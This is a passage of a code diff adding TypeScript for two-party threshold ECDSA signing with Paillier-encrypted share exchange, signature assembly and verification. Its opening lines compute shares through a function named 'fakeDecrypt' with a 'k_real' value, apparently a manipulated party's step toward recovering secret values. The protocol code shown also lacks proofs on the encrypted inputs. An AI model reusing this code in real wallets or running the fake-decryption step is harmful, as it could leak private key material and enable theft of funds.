+      const alpha = fakeDecrypt(modPow(v, -gamma, N * N) * hexToBigInt(shareToBeSend.alpha) % (N * N)) + k_real * gamma
+      const mu = fakeDecrypt(modPow(v, -w, N * N) * hexToBigInt(shareToBeSend.mu as string) % (N * N)) + k_real * w
+
+
+      shareParticipant['alpha'] = bigIntToBufferBE(Ecdsa.curve.scalarReduce(alpha), 32).toString('hex');
+      shareParticipant['mu'] = bigIntToBufferBE(Ecdsa.curve.scalarReduce(mu), 32).toString('hex');
+      delete shareParticipant['l'];
+      delete shareParticipant['m'];
+      delete shareToBeSend['alpha'];
+      delete shareToBeSend['mu'];
+    }
+    if (shareToBeSend['k']) {
+      const n = hexToBigInt(shareToBeSend['n']); // Paillier pub from other signer
+      let pk = getPaillierPublicKey(n);
+      const k = hexToBigInt(shareToBeSend['k']);
+
+      const beta0 = bigintCryptoUtils.randBetween(n / _3n - _1n);
+      shareParticipant.beta = bigIntToBufferBE(Ecdsa.curve.scalarNegate(Ecdsa.curve.scalarReduce(beta0)), 32).toString(
+        'hex'
+      );
+      const alpha = pk.addition(pk.multiply(k, hexToBigInt(shareParticipant.gamma)), pk.encrypt(beta0));
+      shareToBeSend.alpha = bigIntToBufferBE(alpha, 32).toString('hex');
+
+      const nu0 = bigintCryptoUtils.randBetween(n / _3n - _1n);
+      shareParticipant.nu = bigIntToBufferBE(Ecdsa.curve.scalarNegate(Ecdsa.curve.scalarReduce(nu0)), 32).toString(
+        'hex'
+      );
+      const mu = pk.addition(pk.multiply(k, hexToBigInt(shareParticipant.w)), pk.encrypt(nu0));
+      shareToBeSend.mu = bigIntToBufferBE(mu, 32).toString('hex');
+      if (shareParticipant['alpha']) {
+        delete shareToBeSend['n'];
+        delete shareToBeSend['k'];
+      } else {
+        pk = getPaillierPublicKey(hexToBigInt(shareParticipant.n));
+        shareToBeSend['n'] = pk.n.toString(16);
+        shareToBeSend['k'] = bigIntToBufferBE(pk.encrypt(hexToBigInt(shareParticipant.k)), 32).toString('hex');
+      }
+    }
+    if (!('alpha' in shareToBeSend) && !('k' in shareToBeSend)) {
+      shareToBeSend = {
+        i: shareToBeSend['i'],
+        j: shareToBeSend['j'],
+      };
+    }
+    [shareToBeSend['i'], shareToBeSend['j']] = [shareToBeSend['j'], shareToBeSend['i']];
+    if (isGammaShare) {
+      return {
+        muShare: shareToBeSend as MUShare,
+        gShare: shareParticipant as GShare,
+      };
+    }
+    return {
+      aShare: shareToBeSend,
+      bShare: shareParticipant as BShare,
+    };
+  }
+
+  /**
+   * Combine gamma shares to get the private omicron / delta shares
+   * @param {SignCombine} shares
+   * @returns {SignCombineRT}
+   */
+  signCombine(shares: SignCombine): SignCombineRT {
+    const gShare = shares.gShare;
+    const S = shares.signIndex;
+    const gamma = hexToBigInt(gShare.gamma);
+    const alpha = hexToBigInt(gShare.alpha);
+    const beta = hexToBigInt(gShare.beta);
+    const mu = hexToBigInt(gShare.mu);
+    const nu = hexToBigInt(gShare.nu);
+    const k = hexToBigInt(gShare.k);
+    const w = hexToBigInt(gShare.w);
+
+    const delta = Ecdsa.curve.scalarAdd(Ecdsa.curve.scalarMult(k, gamma), Ecdsa.curve.scalarAdd(alpha, beta));
+    const omicron = Ecdsa.curve.scalarAdd(Ecdsa.curve.scalarMult(k, w), Ecdsa.curve.scalarAdd(mu, nu));
+    const Gamma = Ecdsa.curve.basePointMult(gamma);
+
+    return {
+      oShare: {
+        i: gShare.i,
+        y: gShare.y,
+        k: bigIntToBufferBE(k, 32).toString('hex'),
+        omicron: bigIntToBufferBE(omicron, 32).toString('hex'),
+        delta: bigIntToBufferBE(delta, 32).toString('hex'),
+        Gamma: bigIntToBufferBE(Gamma, 33).toString('hex'),
+      },
+      dShare: {
+        i: S.i,
+        j: gShare.i,
+        delta: bigIntToBufferBE(delta, 32).toString('hex'),
+        Gamma: bigIntToBufferBE(Gamma, 33).toString('hex'),
+      },
+    };
+  }
+
+  /**
+   * Sign a message.
+   * @param {Buffer} M Message to be signed
+   * @param {OShare} oShare private omicron share of current participant
+   * @param {DShare} dShare delta share received from the other participant
+   * @param {Hash} hash hashing algorithm implementing Node`s standard crypto hash interface
+   * @param {boolean} shouldHash if true, we hash the provided buffer before signing
+   * @returns {SShare}
+   */
+  sign(M: Buffer, oShare: OShare, dShare: DShare, hash?: Hash, shouldHash = true): SShare {
+    const m = shouldHash ? (hash || createHash('sha256')).update(M).digest() : M;
+
+    const delta = Ecdsa.curve.scalarAdd(hexToBigInt(oShare.delta), hexToBigInt(dShare.delta));
+
+    const R = Ecdsa.curve.pointMultiply(
+      Ecdsa.curve.pointAdd(hexToBigInt(oShare.Gamma), hexToBigInt(dShare.Gamma)),
+      Ecdsa.curve.scalarInvert(delta)
+    );
+    const pointR = secp.Point.fromHex(bigIntToBufferBE(R, 32));
+    const r = pointR.x;
+
+    const s = Ecdsa.curve.scalarAdd(
+      Ecdsa.curve.scalarMult(bigIntFromU8ABE(m), hexToBigInt(oShare.k)),
+      Ecdsa.curve.scalarMult(r, hexToBigInt(oShare.omicron))
+    );
+    return {
+      i: oShare.i,
+      y: oShare.y,
+      R: pointR.toHex(true),
+      s: bigIntToBufferBE(s, 32).toString('hex'),
+    };
+  }
+
+  /**
+   * Construct full signature by combining Sign Shares
+   * @param {SShare[]} shares
+   * @returns {Signature}
+   */
+  constructSignature(shares: SShare[]): Signature {
+    // Every R must match.
+    const R = shares[0]['R'];
+    const isRMatching = shares.map((share) => share['R'] === R).reduce((a, b) => a && b);
+    if (!isRMatching) {
+      throw new Error('R value should be consistent across all shares');
+    }
+
+    let s = shares.map((share) => hexToBigInt(share['s'])).reduce(Ecdsa.curve.scalarAdd);
+    const recid = (R.slice(0, 2) === '03' ? 1 : 0) ^ (s > Ecdsa.curve.order() / BigInt(2) ? 1 : 0);
+
+    // Normalize s.
+    s = s > Ecdsa.curve.order() / BigInt(2) ? Ecdsa.curve.order() - s : s;
+    return {
+      y: shares[0]['y'],
+      r: R.slice(2),
+      s: bigIntToBufferBE(s, 32).toString('hex'),
+      recid: recid,
+    };
+  }
+
+  /**
+   * Verify ecdsa signatures
+   * @param {Buffer} message
+   * @param {Signature } signature
+   * @param {Hash} hash hashing algorithm implementing Node`s standard crypto hash interface
+   * @param {boolean} shouldHash if true, we hash the provided buffer before verifying
+   * @returns {boolean} True if signature is valid; False otherwise
+   */
+  verify(message: Buffer, signature: Signature, hash?: Hash, shouldHash = true): boolean {
+    const messageToVerify = shouldHash ? (hash || createHash('sha256')).update(message).digest() : message;
+    return Ecdsa.curve.verify(
+      messageToVerify,
+      Buffer.concat([
+        Buffer.from([signature['recid']]),
+        bigIntToBufferBE(hexToBigInt(signature['r']), 32),
+        bigIntToBufferBE(hexToBigInt(signature['s']), 32),
+      ]),
+      hexToBigInt(signature['y'])
+    );
+  }
+}
